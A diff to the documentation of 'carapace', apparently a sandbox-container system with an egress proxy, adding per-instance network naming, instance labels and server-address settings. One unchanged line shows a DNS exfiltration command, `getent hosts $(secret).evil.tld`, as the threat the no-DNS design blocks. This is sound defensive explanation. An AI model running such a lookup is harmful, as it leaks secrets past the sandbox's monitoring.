@@ -110,14 +110,14 @@ All outbound traffic from sandbox containers is routed through the carapace serv
 
 A resolver that forwards external names is a channel past the proxy: `getent hosts $(secret).evil.tld`, or any `getaddrinfo` call inside a script, carries data to whoever runs the authoritative server for `evil.tld`, and the sentinel never sees it. The sandbox needs no DNS:
 
-- It reaches the server by IP. The proxy URL, the git origin (`GIT_REPO_URL`), `CARAPACE_API_URL` and `NO_PROXY` are all built from the server's IP on the sandbox network (Docker) or its ClusterIP (Kubernetes).
+- It reaches the server by IP, or by the name of a container on its own network. The proxy URL, the git origin (`GIT_REPO_URL`), `CARAPACE_API_URL` and `NO_PROXY` are all built from the [server address](#server-address): the server's IP on the sandbox network (Docker), its ClusterIP (Kubernetes), or `CARAPACE_SANDBOX_SERVER_HOST`.
 - Proxy-aware tools send the hostname to the proxy, which resolves it on the server. pip, uv, npm, git over HTTPS and curl all work this way.
 - [Tunnels](#tunnels) shadow their hosts in `/etc/hosts` with loopback addresses.
 
 How each runtime enforces it:
 
 - **Kubernetes**: the NetworkPolicy blocks DNS along with all other egress except the proxy and the sandbox API. That is the barrier. On top, sandbox pods get `dnsPolicy: None` with `127.0.0.1` as their only nameserver. Nothing listens there, so lookups fail immediately instead of hanging until the blocked kube-dns times out. That setting only rewrites `/etc/resolv.conf`, so it does not stop a query sent straight to a resolver's IP. Without a CNI that enforces the NetworkPolicy the sandbox has direct egress, DNS included (see [kubernetes.md](kubernetes.md#networkpolicy)).
-- **Docker**: Docker's embedded DNS (`127.0.0.11`) answers only names on the network itself (other containers) for containers on an `internal` network such as `carapace-sandbox`. It does not forward other queries upstream (verified with a packet capture on Docker Engine 29), so carapace configures nothing extra. On another engine version, check that `getent hosts example.com` fails inside a sandbox.
+- **Docker**: Docker's embedded DNS (`127.0.0.11`) answers only names on the network itself (other containers) for containers on an `internal` network such as `carapace-sandbox-default`. It does not forward other queries upstream (verified with a packet capture on Docker Engine 29), so carapace configures nothing extra. On another engine version, check that `getent hosts example.com` fails inside a sandbox.
 
 Tools that insist on resolving a hostname locally before they connect fail in the sandbox. Proxy-aware clients are unaffected.
 
@@ -251,13 +251,28 @@ carapace supports two sandbox runtimes, configured via `CARAPACE_SANDBOX_RUNTIME
 
 ### Docker
 
-The default runtime. Uses the Docker socket (`/var/run/docker.sock`) to manage containers. Sandbox containers run on an internal Docker network (`carapace-sandbox`) with no direct internet access.
+The default runtime. Uses the Docker socket (`/var/run/docker.sock`) to manage containers. Sandbox containers run on an internal Docker network (`carapace-sandbox-<instance>`, see below) with no direct internet access. If the server's own container is on a network whose name ends in `_carapace-sandbox-<instance>` (Docker Compose prefixes networks with the project name), sandboxes go there.
 
 ### Kubernetes
 
 For cluster deployments. Sandbox sessions run as Kubernetes StatefulSets with per-session PVCs (via `volumeClaimTemplates`). Commands are executed via the Kubernetes exec API. On idle timeout the StatefulSet is scaled to 0 replicas (PVC retained); on resume it's scaled back to 1. The warm-pool claim path is currently implemented here: generic prestarted base sandboxes can be claimed for new sessions when `CARAPACE_SANDBOX_WARM_POOL_SIZE` is set. See [kubernetes.md](kubernetes.md) for full details.
 
 Both runtimes implement the same `ContainerRuntime` interface, so the rest of carapace doesn't need to know which backend is in use.
+
+### Instances
+
+Several carapace servers can share one Docker daemon or Kubernetes namespace, for example a deployment and development stacks. `CARAPACE_SANDBOX_INSTANCE` (default `default`) keeps them apart: every sandbox resource (containers or StatefulSets, warm-pool members and egress-check probes) carries the label `carapace.instance=<instance>`, and a server lists only its own. Startup orphan cleanup, reconciliation, the warm pool and leftover-probe removal therefore never touch another instance's sandboxes. On Docker the instance also names the sandbox network, `carapace-sandbox-<instance>`. Container and StatefulSet names don't include it, so two instances can't run a sandbox of the same id. Session ids are random, so that only matters for a copied data dir. The value must be a valid Kubernetes label value: up to 63 letters, digits, `-`, `_` and `.`, starting and ending with a letter or digit.
+
+### Server address
+
+Sandboxes reach the server's proxy (`CARAPACE_SANDBOX_PROXY_PORT`, default `3128`) and sandbox API (`CARAPACE_SERVER_SANDBOX_PORT`, default `8322`) on one host:
+
+- `CARAPACE_SANDBOX_SERVER_HOST`, a host name or IP, when set. A host name has to resolve inside the sandbox, which has no DNS beyond Docker's embedded resolver: in practice the name of a container on the sandbox network, such as a relay that forwards both ports to the server.
+- Otherwise the server container's IP on the sandbox network (Docker), or the ClusterIP of `CARAPACE_SANDBOX_K8S_SERVER_SERVICE` (Kubernetes).
+
+A server that runs outside a container has no such default and refuses to start without `CARAPACE_SANDBOX_SERVER_HOST`. There is no gateway fallback: Docker Desktop keeps the bridge gateway inside its VM, where nothing reaches a server on the Mac.
+
+The listeners bind to loopback by default: `CARAPACE_SERVER_HOST` (main API) and `CARAPACE_SERVER_SANDBOX_HOST` (sandbox API and proxy) are both `127.0.0.1`. The server image sets both to `0.0.0.0`, so Compose and the Helm chart need nothing. A server outside a container binds the sandbox listeners to an address the sandboxes' path arrives at, such as the Docker bridge gateway on Linux.
 
 ## Docker socket
 
